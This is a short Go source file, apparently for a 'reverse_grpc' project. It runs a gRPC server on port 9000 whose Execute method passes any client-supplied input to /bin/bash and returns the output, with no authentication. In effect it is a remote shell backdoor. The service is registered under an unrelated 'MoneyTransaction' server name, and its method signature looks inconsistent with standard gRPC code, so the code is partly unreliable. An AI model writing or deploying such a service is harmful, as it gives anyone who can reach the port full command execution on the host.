package main

import (
	"bytes"
	"net"
	"os/exec"
	pb "reverse_grpc/reversepb"
	"time"

	grpc "google.golang.org/grpc"
	"google.golang.org/grpc/reflection"
	"log"
	"strings"
)

const (
	port string = ":9000"
)

type ReverseServer struct {
}

func (r *ReverseServer) Execute(in *pb.ReverseRequest) (*pb.ReverseResponse, error) {
	response := &pb.ReverseResponse{}
	var std_out bytes.Buffer
	var std_err bytes.Buffer

	cmd := exec.Command("/bin/bash")
	cmd.Stdin = strings.NewReader(in.Stdin)
	cmd.Stdout = &std_out
	cmd.Stderr = &std_err

	err := cmd.Run()
	if err != nil {
		return response, err
	}

	response.Stdout = std_out.String()
	response.Stderr = std_err.String()
	return response, nil
}

func main() {
	lsn, err := net.Listen("tcp", port)
	if err != nil {
		log.Fatalf("Could not listen %s %s", port, err)
	}

	s := grpc.NewServer()

	srv := &ReverseServer{}
	pb.RegisterMoneyTransactionServer(s, srv)
	reflection.Register(s)

	if err := s.Serve(lsn); err != nil {
		log.Fatalf("Could not serve %s", err)
		return
	}
}
